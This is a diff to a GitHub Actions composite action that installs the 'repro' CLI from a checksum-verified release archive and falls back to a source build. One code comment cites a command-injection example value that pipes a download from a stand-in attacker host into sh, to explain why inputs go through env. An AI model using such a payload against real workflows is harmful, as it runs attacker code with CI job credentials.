@@ -1,14 +1,21 @@
 name: Setup reprobuild (install the repro CLI)
 description: >
-  Clone the reprobuild source at a pin and build the `repro` CLI, putting it on
-  PATH. The reprobuild flake/env.ps1 inputs that the build needs must already be
-  provisioned adjacent to the host checkout (see the companion
-  `reprobuild-provision` action). On Linux/macOS the CLI is built via the Nix
-  dev shell; on Windows it is built by replaying reprobuild's own env.ps1 DIY
-  contract.
+  Put the `repro` CLI on PATH, preferring the prebuilt binary from a GitHub
+  Release and falling back to a source build only when no verified asset exists
+  for the running platform.
 
-  This is the "install the tool" half of the reprobuild dev-env flavor. It is the
-  reprobuild analogue of `setup-nix`.
+  Resolution order:
+    1. A `repro` already on PATH  -> reuse it, do nothing.
+    2. The prebuilt release archive for this OS/arch -> download, verify its
+        SHA-256 against the release's SHA256SUMS, unpack, add bin/ to PATH.
+    3. Source build -- Nix dev shell on Linux/macOS, env.ps1 DIY contract on
+        Windows. Announced with a ::warning:: rather than taken silently, because
+        it is minutes-to-hours slower and needs the sibling repos that
+        `reprobuild-provision` clones.
+
+  Step 2 is the reason release archives are published at all. It did not exist
+  until now: this action probed PATH and otherwise went straight to a source
+  build, so the release assets were never downloaded by anything.
 
 inputs:
   gh-token:
@@ -35,23 +42,66 @@ inputs:
     description: Attic server endpoint.
     required: false
     default: "https://cache.metacraft-labs.com/"
+  repro-version:
+    description: >
+      Release to install the prebuilt `repro` CLI from -- a tag (`v0.2.0`, or
+      the bare `0.2.0`) or `latest`. Pin this to make a consumer's CI
+      reproducible across reprobuild releases. Ignored when `from-source` is
+      true, or when a `repro` is already on PATH.
+    required: false
+    default: "latest"
+  from-source:
+    description: >
+      Skip the prebuilt release entirely and build the CLI from source. For
+      testing an unreleased reprobuild change, or a platform whose release
+      archive is known-bad. Pair with `repro-build-pin` to choose the ref.
+    required: false
+    default: "false"
+  require-checksum:
+    description: >
+      Refuse to install a release archive that cannot be checked against the
+      SHA256SUMS the release publishes; fall back to a source build instead.
+      Leave this true -- only the literal string `false` turns it off, so a
+      typo fails closed rather than silently installing unverified.
+
+      Scope, stated plainly so nobody mistakes it for more than it is:
+      SHA256SUMS is served from the same origin as the archive, so this is an
+      INTEGRITY check (truncation, a bad mirror, a half-uploaded asset), not a
+      trust root. It does not authenticate the publisher; an attacker who can
+      serve the release can serve a matching SHA256SUMS. Authenticity needs
+      signing (cosign / GitHub artifact attestations) and is a separate change.
+      Setting this false drops even the integrity check, leaving TLS alone --
+      needed only for releases v0.1.0..v0.1.3, which predate checksum
+      publication.
+    required: false
+    default: "true"
   repro-build-pin:
     description: >
       Git ref (branch, tag, or SHA) of `metacraft-labs/reprobuild` to build the
-      `repro` CLI from. Defaults to `dev`, the branch reprobuild's own CI gates on.
+      `repro` CLI from when the SOURCE fallback is used. Defaults to `dev`, the
+      branch reprobuild's own CI gates on. This does not affect which release
+      the prebuilt path installs -- that is `repro-version`.
     required: false
     default: "dev"
+
+outputs:
+  install-source:
+    description: >
+      How `repro` ended up on PATH: `path` (already there), `release` (prebuilt
+      archive), or `source` (built here). Useful for asserting in CI that a
+      given runner class is actually being served by a prebuilt binary.
+    value: ${{ steps.decide.outputs.install-source }}
+  repro-bin-dir:
+    description: Directory added to PATH containing the `repro` CLI (empty when it was already on PATH).
+    value: ${{ steps.decide.outputs.repro-bin-dir }}
 
 runs:
   using: composite
   steps:
     # Idempotency probe: if a `repro` CLI is already on PATH (e.g. baked into
     # the runner image, or installed by an earlier invocation of this action in
-    # the same job), skip the clone + Nix install + build entirely. This makes
-    # the action a cheap no-op on hosts that already ship `repro` — the whole
-    # point of distributing `repro` as a self-contained portable binary. When
-    # `repro` is NOT found, `already-present` stays "false" and every existing
-    # step below runs exactly as before.
+    # the same job), skip everything below. This makes the action a cheap no-op
+    # on hosts that already ship `repro`.
     - name: Detect pre-installed repro CLI
       id: probe
       shell: bash
@@ -71,12 +121,105 @@ runs:
             echo "${dir}" >> "$GITHUB_PATH"
           fi
         else
-          echo "no repro CLI on PATH; will clone + build"
+          echo "no repro CLI on PATH"
           echo "already-present=false" >> "$GITHUB_OUTPUT"
         fi
 
+    # ── Preferred path: the prebuilt release binary ───────────────────────────
+    #
+    # install-release.sh exits 3 (not 1) when this platform simply has no
+    # verified asset in the target release. That is a routine state -- e.g. a
+    # release cut without a windows-aarch64 leg -- and it means "fall back",
+    # whereas exit 1 (checksum mismatch, corrupt archive, unusable binary) is a
+    # real failure that must NOT be papered over by silently building from
+    # source. Only exit 3 is caught here.
+    - name: Install prebuilt repro CLI from GitHub Release
+      id: release
+      if: ${{ steps.probe.outputs.already-present != 'true' && inputs.from-source != 'true' }}
+      shell: bash
+      env:
+        REPRO_VERSION: ${{ inputs.repro-version }}
+        REPRO_REQUIRE_CHECKSUM: ${{ inputs.require-checksum }}
+        # Only used to authenticate the `latest` lookup against api.github.com.
+        # Anonymous API access is 60 requests/hour PER IP and the whole
+        # ephemeral-runner fleet egresses from one address, so without a token
+        # `repro-version: latest` starts 403ing under ordinary load -- which
+        # this action reads as "cannot resolve latest" and turns into a silent,
+        # much slower source build.
+        REPRO_GITHUB_TOKEN: ${{ inputs.gh-token }}
+      run: |
+        set -uo pipefail
+        install_dir="${RUNNER_TEMP}/reprobuild-release"
+        set +e
+        output="$(REPRO_INSTALL_DIR="${install_dir}" \
+          bash "${{ github.action_path }}/install-release.sh")"
+        rc=$?
+        set -e
+
+        if [ "${rc}" -eq 0 ]; then
+          bin_dir="${output##*REPRO_BIN_DIR=}"
+          echo "installed=true" >> "$GITHUB_OUTPUT"
+          echo "bin-dir=${bin_dir}" >> "$GITHUB_OUTPUT"
+          echo "${bin_dir}" >> "$GITHUB_PATH"
+        elif [ "${rc}" -eq 3 ]; then
+          # Expected "no prebuilt available here" -- the reason was printed to
+          # stderr by the script. The loud announcement happens in `decide`.
+          echo "installed=false" >> "$GITHUB_OUTPUT"
+        else
+          echo "::error::setup-reprobuild: installing the prebuilt repro CLI failed (exit ${rc}). Not falling back to a source build -- see the error above."
+          exit "${rc}"
+        fi
+
+    # Single place that decides whether the source build runs, so the condition
+    # is not repeated (and mis-repeated) across five steps.
+    - name: Decide install path
+      id: decide
+      shell: bash
+      # Caller-supplied inputs arrive through `env`, never through `${{ }}`
+      # inside the script body. A `${{ }}` expression is textually pasted into
+      # the script before bash parses it, so a caller passing
+      #   repro-version: latest$(curl attacker.example/x | sh)
+      # would have had that command substitution EXECUTED by the ::warning::
+      # line below -- with this action's job token in scope. `setup-dev-env`
+      # forwards these from ~20 repos, some of which wire them to
+      # workflow_dispatch inputs, so they are not trusted constants.
+      env:
+        FROM_SOURCE: ${{ inputs.from-source }}
+        REPRO_VERSION: ${{ inputs.repro-version }}
+        REPRO_BUILD_PIN: ${{ inputs.repro-build-pin }}
+        ALREADY_PRESENT: ${{ steps.probe.outputs.already-present }}
+        RELEASE_INSTALLED: ${{ steps.release.outputs.installed }}
+        RELEASE_BIN_DIR: ${{ steps.release.outputs.bin-dir }}
+      run: |
+        set -euo pipefail
+        if [ "${ALREADY_PRESENT}" = "true" ]; then
+          echo "install-source=path"    >> "$GITHUB_OUTPUT"
+          echo "repro-bin-dir="         >> "$GITHUB_OUTPUT"
+          echo "need-source=false"      >> "$GITHUB_OUTPUT"
+        elif [ "${RELEASE_INSTALLED}" = "true" ]; then
+          echo "install-source=release" >> "$GITHUB_OUTPUT"
+          echo "repro-bin-dir=${RELEASE_BIN_DIR}" >> "$GITHUB_OUTPUT"
+          echo "need-source=false"      >> "$GITHUB_OUTPUT"
+        else
+          # Announce the fallback. A source build is minutes-to-hours slower and
+          # pulls in the whole Nix/env.ps1 toolchain, so a consumer silently
+          # dropping into it -- which is what happened on EVERY runner before
+          # this action learned to use releases -- should be visible, not
+          # inferred from a long job time.
+          if [ "${FROM_SOURCE}" = "true" ]; then
+            echo "::notice::setup-reprobuild: building repro from source because from-source=true (pin: ${REPRO_BUILD_PIN})."
+          else
+            echo "::warning::setup-reprobuild: no verified prebuilt repro release for this platform (requested: ${REPRO_VERSION}); FALLING BACK to a source build from '${REPRO_BUILD_PIN}'. See the preceding log lines for why. This is much slower and requires the sibling repos provisioned by reprobuild-provision."
+          fi
+          echo "install-source=source"  >> "$GITHUB_OUTPUT"
+          echo "repro-bin-dir="         >> "$GITHUB_OUTPUT"
+          echo "need-source=true"       >> "$GITHUB_OUTPUT"
+        fi
+
+    # ── Fallback path: build from source (unchanged behaviour) ────────────────
+
     - name: Clone reprobuild source
-      if: ${{ steps.probe.outputs.already-present != 'true' }}
+      if: ${{ steps.decide.outputs.need-source == 'true' }}
       shell: bash
       env:
         REPRO_BUILD_PIN: ${{ inputs.repro-build-pin }}
@@ -95,7 +238,7 @@ runs:
         fi
 
     - name: Install Nix (Linux/macOS, to build repro)
-      if: ${{ steps.probe.outputs.already-present != 'true' && runner.os != 'Windows' }}
+      if: ${{ steps.decide.outputs.need-source == 'true' && runner.os != 'Windows' }}
       uses: metacraft-labs/metacraft-github-actions/setup-nix@main
       with:
         gh-token: ${{ inputs.gh-token }}
@@ -106,7 +249,7 @@ runs:
         attic-endpoint: ${{ inputs.attic-endpoint }}
 
     - name: Build repro CLI (Linux/macOS)
-      if: ${{ steps.probe.outputs.already-present != 'true' && runner.os != 'Windows' }}
+      if: ${{ steps.decide.outputs.need-source == 'true' && runner.os != 'Windows' }}
       shell: bash
       run: |
         set -euo pipefail
@@ -145,7 +288,7 @@ runs:
         echo "${PWD}/build/bin" >> "$GITHUB_PATH"
 
     - name: Relocate reprobuild + build repro CLI (Windows)
-      if: ${{ steps.probe.outputs.already-present != 'true' && runner.os == 'Windows' }}
+      if: ${{ steps.decide.outputs.need-source == 'true' && runner.os == 'Windows' }}
       shell: bash
       run: |
         set -euo pipefail
@@ -163,7 +306,7 @@ runs:
         fi
 
     - name: Build repro CLI (Windows)
-      if: ${{ steps.probe.outputs.already-present != 'true' && runner.os == 'Windows' }}
+      if: ${{ steps.decide.outputs.need-source == 'true' && runner.os == 'Windows' }}
       shell: pwsh
       run: |
         # Windows-side: replay reprobuild's own DIY contract. Source its env.ps1
